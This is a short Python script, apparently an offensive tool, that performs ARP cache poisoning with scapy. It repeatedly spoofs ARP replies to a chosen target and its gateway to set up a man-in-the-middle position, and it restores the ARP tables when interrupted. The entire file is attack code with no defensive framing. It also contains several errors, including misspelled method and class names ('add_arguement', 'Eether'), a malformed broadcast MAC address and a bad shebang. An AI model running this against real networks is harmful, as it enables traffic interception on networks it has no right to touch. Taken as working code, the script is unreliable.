#!/usr/bin/enc python

import scapy.all as scapy
import argparse
import time
import sys

def get_arguements():
    parser= argparse.ArgumentParser()
    parser.add_arguement("-t", "--target", dest="target", help="Specify target ip")
    parser.add_arguement("-g", "--gateway", dest="gateway", help="Specify spoof ip")
    return parser.parse_args()

# Function to get the mac address of an ip
def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Eether(dst="ff:ff:ff:ff:Ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# Function to restore the arp tables of target and gateway when "Ctrl C" is detected
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, 4) # Send 4 to avoid packet loss

# Function to poison arp table of target
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

arguements = get_arguements()
sent_packets = 0
try:
    while True: # Keep sending packets infinitely
        spoof(arguements.target, arguements.gateway)
        spoof(arguements.gateway, arguements.target) # Poison arp table of gateway for MITM
        sent_packets += 2
        print("\r[+] Sent packets: " + str(sent_packets))
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Ctrl + C detected....Restoring ATP Tables...")
    restore(arguements.target, arguements.gateway)
    restore(arguements.gateway, arguements.target)
